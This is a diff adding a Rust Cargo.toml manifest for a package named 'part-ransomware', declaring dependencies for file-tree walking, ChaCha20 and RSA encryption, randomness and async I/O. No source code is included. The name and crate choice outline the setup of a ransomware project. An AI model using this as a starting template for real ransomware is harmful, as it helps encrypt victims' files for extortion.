@@ -1,0 +1,16 @@
+[package]
+name = "part-ransomware"
+version = "0.1.0"
+edition = "2021"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[dependencies]
+async-std = "1.12.0"
+chacha20 = "0.9.1"
+cipher = "0.4.4"
+hex = "0.4.3"
+rand = "0.8.5"
+walkdir = "2"
+rsa = "0.9.0"
+anyhow = "1.0.71"
